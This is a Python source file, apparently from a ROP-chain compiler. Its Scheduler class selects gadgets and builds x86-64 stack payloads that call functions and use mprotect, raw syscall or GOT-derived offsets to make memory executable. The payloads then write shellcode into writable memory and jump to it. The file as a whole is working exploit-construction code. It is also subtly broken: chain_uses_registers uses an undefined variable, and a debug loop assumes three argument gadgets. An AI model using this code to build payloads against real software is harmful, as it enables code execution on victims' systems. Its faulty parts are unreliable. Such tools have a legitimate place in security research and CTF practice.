import struct, logging, collections
import goal as go, gadget as ga
import z3helper

PAGE_MASK = 0xfffffffffffff000
PROT_RWX = 7

class Scheduler(object):
  func_calling_convention = [ "rdi", "rsi", "rdx", "rcx", "r8", "r9" ]
  #syscall_calling_convention = [ "rdi", "rsi", "rdx", "r10", "r8", "r9" ]  # TODO cover the syscall case
  all_registers = [ "rax", "rbx", "rcx", "rdx", "rdi", "rsi", "rbp", "r10", "r8", "r9", "r11", "r12", "r13", "r14", "r15" ]

  def __init__(self, gadgets, goal_resolver, level):
    logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s")
    self.logger = logging.getLogger(self.__class__.__name__)
    self.logger.setLevel(level)

    self.gadgets = gadgets
    self.load_register_chains = {}
    self.write_memory_chains = []
    self.store_mem_gadgets = collections.defaultdict(dict)

    self.solver = z3helper.Z3Helper()
    self.goal_resolver = goal_resolver
    self.goals = goal_resolver.get_goals()
    self.chain = self.chain_gadgets()

  def get_chain(self):
    return self.chain

  def find_load_stack_gadget(self, register_name, no_clobber = None):
    if register_name in self.load_register_chains:
      return self.load_register_chains[register_name]

    best = None
    for gadget in self.gadgets:
      if (type(gadget) == ga.LoadMem and gadget.inputs[0] == "rsp" # It's a load from the stack (most likely a pop)
        and register_name == gadget.output # and it's for the correct register
        and (no_clobber == None or not gadget.clobbers_registers(no_clobber))
        and (best == None or best.complexity() > gadget.complexity())): # and it's got a better complexity than the current one
          best = gadget

    if best != None:
      self.load_register_chains[register_name] = best
      self.logger.debug("Found LoadStack %s Gadget:\n%s\n", register_name, best)

    # TODO Synthesize gadgets for missing types and add them to self.load_register_chains
    return best

  def find_gadget(self, gadget_type, input_registers = None, output_register = None, no_clobber = None):
    best = None
    best_complexity = None
    for gadget in self.gadgets:
      if (type(gadget) == gadget_type # Match the requested type
        and (input_registers == None # Not looking for a gadget with a specific register as input
          or (gadget.inputs[0] == input_registers[0] # Only looking for one specific input
            and (len(gadget.inputs) == 1 or gadget.inputs[1] == input_registers[1]))) # Also looking to match the second input
        and (output_register == None or gadget.output == output_register) # looking to match the output
        and (no_clobber == None or not gadget.clobbers_registers(no_clobber)) # Can't clobber anything weneed
        and (best == None or best_complexity > gadget.complexity())): # and it's got a better complexity than the current one
          best = gadget
          best_complexity = best.complexity()

    if best != None:
      self.logger.debug("Found %s %s Gadget:\n%s\n", gadget_type.__name__, best.inputs[0], best)

    # TODO Synthesize gadgets for missing types
    return best

  def find_store_mem_gadgets(self, addr_reg, value_reg):
    if value_reg in self.store_mem_gadgets[addr_reg]:
      return self.store_mem_gadgets[addr_reg][value_reg]

    best = None
    for gadget in self.gadgets:
      if type(gadget) != ga.StoreMem:
        continue

      if (type(gadget) == ga.StoreMem
        and addr_reg == gadget.inputs[0]
        and value_reg == gadget.inputs[1]
        and (best == None or best.complexity() > gadget.complexity())): # and it's got a better complexity than the current one
          best = gadget

    self.store_mem_gadgets[addr_reg][value_reg] = best
    if best != None:
      self.logger.debug("Found StoreMem(%s, %s) Gadget:\n%s\n", addr_reg, value_reg, best)
    return best

  def find_arg_gadgets(self, count):
    for goal in self.goals:
      needed_args = self.func_calling_convention[0:count]

      for arg_needed in needed_args:
        if arg_needed in self.load_register_chains: # Previously found it
          continue
        gadget = self.find_load_stack_gadget(arg_needed)

  def combined_complexity(self, chain):
    return sum([gadget.complexity() for gadget in chain])

  def chain_uses_registers(self, chain, registers):
    for gadget in chain:
      for reg in registers:
        if gadget.uses_register(avoid_reg):
          return True
    return False

  def find_write_memory_gadgets(self):
    self.write_memory_chains = []
    for addr_reg in self.all_registers:
      load_addr_gadget = self.find_load_stack_gadget(addr_reg)
      if load_addr_gadget == None:
        continue

      for value_reg in self.all_registers:
        if addr_reg == value_reg:
          continue

        load_value_gadget = self.find_load_stack_gadget(value_reg)
        if load_value_gadget == None or load_value_gadget.clobbers_register(addr_reg):
          continue

        store_mem_gadget = self.find_store_mem_gadgets(addr_reg, value_reg)
        if store_mem_gadget != None:
          chain = [load_addr_gadget, load_value_gadget, store_mem_gadget]
          complexity = self.combined_complexity(chain)
          self.write_memory_chains.append((chain, complexity))

  def get_write_memory_gadget(self, avoid_registers = None):
    best = best_complexity = None
    for (chain, complexity) in self.write_memory_chains:
      if best_complexity == None or best_complexity > complexity:
        if avoid_registers == None or not self.chain_uses_registers(chain, avoid_registers):
          best_complexity = complexity
          best = chain

    if best == None:
      raise RuntimeError("Could not find a way to write to memory")
    return best

  def ap(self, address):
    """Packs an address into a string. ap is short for Address Pack"""
    if address < 0:
      address = 2**64 + address
    return struct.pack("Q", address)

  def create_set_reg_chain(self, gadget, value, next_address):
    if type(value) != str:
      value = self.ap(value)

    chain  = gadget.params[0] * "A"
    chain += value
    chain += (gadget.rip_in_stack_offset - len(chain)) * "B"
    chain += self.ap(next_address)
    chain += (gadget.stack_offset - len(chain)) * "C"
    return chain

  def create_function_chain(self, goal, next_address = 0x4444444444444444):
    chain = ""
    prev_gadget = goal.address
    self.logger.info("Creating function chain for %s(%s) and finishing with a return to 0x%x", goal.name,
      ",".join([hex(x) for x in goal.arguments]), next_address)

    self.find_arg_gadgets(len(goal.arguments))
    for i in range(len(goal.arguments)-1, -1, -1):
      arg = goal.arguments[i]
      reg = self.func_calling_convention[i]
      if not reg in self.load_register_chains:
        msg = "No gadget found to set {} register during function call to {}".format(reg, goal.name)
        self.logger.critical(msg)
        raise RuntimeError(msg)

      gadget = self.load_register_chains[reg]
      arg_chain = self.create_set_reg_chain(gadget, arg, prev_gadget)
      chain = arg_chain + chain

      prev_gadget = gadget.address

    chain = chain + self.ap(next_address)
    return (chain, prev_gadget)

  def create_read_add_jmp_function_chain(self, address, offset, arguments, end_address):
    jump_gadget = None
    arg_gadgets = []

    # Look for all the needed gadgets
    original_offset = offset
    for jump_reg in self.all_registers:
      read_gadget = set_read_addr_gadget = None
      for addr_reg in self.all_registers:
        if addr_reg == jump_reg: continue
        read_gadget = self.find_gadget(ga.LoadMem, input_registers = [addr_reg], output_register = jump_reg)
        if read_gadget == None:
          continue

        set_read_addr_gadget = self.find_load_stack_gadget(read_gadget.inputs[0], [jump_reg])
        if set_read_addr_gadget == None:
          continue
        break

      if set_read_addr_gadget == None or read_gadget == None:
        continue

      jump_gadget = self.find_gadget(ga.Jump, [jump_reg])
      if jump_gadget == None:
        continue

      add_jump_reg_gadget = set_add_reg_gadget = None
      for add_reg in self.all_registers:
        offset = original_offset
        if add_reg == jump_reg: continue

        add_jump_reg_gadget = self.find_gadget(ga.AddGadget, [jump_reg, add_reg], jump_reg)
        if add_jump_reg_gadget == None: # If we can't find an AddGadget, try finding a SubGadget and negating
          add_jump_reg_gadget = self.find_gadget(ga.SubGadget, [jump_reg, add_reg], jump_reg)
          offset = -offset
          if add_jump_reg_gadget == None:
            continue

        set_add_reg_gadget = self.find_load_stack_gadget(add_reg, [jump_reg])
        if set_add_reg_gadget == None:
          continue
        break

      if add_jump_reg_gadget == None:
        continue

      arg_gadgets = []
      no_clobber = [jump_reg]
      for i in range(len(arguments)):
        reg = self.func_calling_convention[i]
        arg_gadget = self.find_load_stack_gadget(reg, no_clobber)
        if arg_gadget != None:
          arg_gadgets.append(arg_gadget)
        no_clobber.append(reg)

      if len(arg_gadgets) == len(arguments):
        break

    # Couldn't find all the necessary gadgets
    if len(arg_gadgets) != len(arguments):
      return (None, None)

    self.logger.debug("Found all necessary gadgets for reading the GOT and calling a different function:")
    for gadget in [set_read_addr_gadget, read_gadget, set_add_reg_gadget, add_jump_reg_gadget, arg_gadgets[0], arg_gadgets[1], arg_gadgets[2], jump_gadget]:
      self.logger.debug(gadget)

    # Start building the chain
    start_of_function_address = jump_gadget.address
    if len(arg_gadgets) > 0:
      start_of_function_address = arg_gadgets[0].address

    # set the read address
    chain = self.create_set_reg_chain(set_read_addr_gadget, address, read_gadget.address)

    # read the address in the GOT
    chain += (read_gadget.rip_in_stack_offset - len(chain)) * "B"
    chain += self.ap(set_add_reg_gadget.address)
    chain += (set_add_reg_gadget.stack_offset - len(chain)) * "C"

    # set the offset from the base to the target
    chain += self.create_set_reg_chain(set_add_reg_gadget, offset, add_jump_reg_gadget.address)

    # add the offset
    chain += (add_jump_reg_gadget.rip_in_stack_offset - len(chain)) * "B"
    chain += self.ap(start_of_function_address)
    chain += (add_jump_reg_gadget.stack_offset - len(chain)) * "C"

    # Set the arguments for the function
    for i in range(len(arg_gadgets)):
      next_address = jump_gadget.address
      if i + 1 < len(arguments):
        next_address = arg_gadgets[i + 1].address
      chain += self.create_set_reg_chain(arg_gadgets[i], arguments[i], next_address)

    # Finally, jump to the function
    chain += (jump_gadget.stack_offset - len(chain)) * "C"
    chain += self.ap(end_address)

    return (chain, set_read_addr_gadget.address)

  def create_shellcode_address_chain(self, goal):
    addresses = self.goal_resolver.resolve_functions(["mprotect", "syscall"])

    if addresses["mprotect"] != None:
      self.logger.info("Found mprotect, using to change shellcode permissions")
      mprotect_goal = go.FunctionGoal("mprotect", addresses["mprotect"], [goal.shellcode_address & PAGE_MASK, 0x1000, PROT_RWX])
      return self.create_function_chain(mprotect_goal, goal.shellcode_address)
    elif addresses["syscall"] != None:
      self.logger.info("Found syscall(), using it to call mprotect to change shellcode permissions")
      syscall_goal = go.FunctionGoal("syscall", addresses["syscall"], [10, goal.shellcode_address & PAGE_MASK, 0x1000, PROT_RWX])
      return self.create_function_chain(syscall_goal, goal.shellcode_address)

    # TODO add mmap/memcpy, mmap + rop memory writing, using syscalls instead of functions, and others ways to change memory protections


    self.logger.info("Couldn't find mprotect or syscall, restorting to reading the GOT and computing addresses")
    functions_in_got = ["printf", "puts", "read", "open", "close", "exit"] # Keep trying, in case they don't use the first function
    for base in functions_in_got:
      base_address_in_got, offset_in_libc = self.goal_resolver.resolve_symbol_from_got(base, "mprotect")
      if base_address_in_got == None or offset_in_libc == None:
        continue
      mprotect_args = [goal.shellcode_address & PAGE_MASK, 0x2000, PROT_RWX]
      chain, next_address = self.create_read_add_jmp_function_chain(base_address_in_got, offset_in_libc, mprotect_args, goal.shellcode_address)
      if chain != None:
        return chain, next_address

    raise RuntimeError("Failed finding necessary gadgets for shellcode address goal")

  def create_write_memory_chain(self, buf, address, next_address):
    """Generates a chain that will write the buffer to the given address.  For simplicity, the buffer must b 8 bytes"""
    if len(buf) != 8:
      raise RuntimeError("Write memory chains can only write memory in chunks of 8 bytes, requested %d" % len(buf))

    load_addr_gadget, load_value_gadget, store_mem_gadget = self.get_write_memory_gadget()
    chain = self.create_set_reg_chain(load_addr_gadget, address, load_value_gadget.address)
    chain += self.create_set_reg_chain(load_value_gadget, buf, store_mem_gadget.address)

    set_mem_rop = store_mem_gadget.rip_in_stack_offset * "B"
    set_mem_rop += self.ap(next_address)
    set_mem_rop += (store_mem_gadget.stack_offset - len(set_mem_rop)) * "C"
    chain += set_mem_rop

    return (chain, load_addr_gadget.address)

  def create_write_shellcode_chain(self, shellcode, address, next_address):
    if len(shellcode) % 8 != 0:
      shellcode +=  (8 - (len(shellcode) % 8)) * "E" # PAD it to be 8 byte aligned

    chain = ""
    addr = address
    for i in range(0, len(shellcode), 8):
      single_write_chain, next_address = self.create_write_memory_chain(shellcode[i:i+8], addr, next_address)
      chain = single_write_chain + chain
      addr += 8
    return chain, next_address

  def create_shellcode_chain(self, goal):
    shellcode_address = self.goal_resolver.get_writable_memory()
    self.find_write_memory_gadgets()

    shellcode_goal = go.ShellcodeAddressGoal(shellcode_address)
    shellcode_chain, next_address = self.create_shellcode_address_chain(shellcode_goal)

    chain, next_address = self.create_write_shellcode_chain(goal.shellcode, shellcode_address, next_address)
    return (chain + shellcode_chain), next_address

  def chain_gadgets(self):
    chain = ""
    next_address = 0x4444444444444444
    for i in range(len(self.goals)-1, -1, -1):
      goal = self.goals[i]
      if type(goal) == go.FunctionGoal:
        goal_chain, next_address = self.create_function_chain(goal, next_address)
        self.logger.debug("Function call to %s's first gadget is at 0x%x", goal.name, next_address)
      elif type(goal) == go.ShellcodeAddressGoal:
        goal_chain, next_address = self.create_shellcode_address_chain(goal)
      elif type(goal) == go.ShellcodeGoal:
        goal_chain, next_address = self.create_shellcode_chain(goal)

      chain = goal_chain + chain

    return self.ap(next_address) + chain

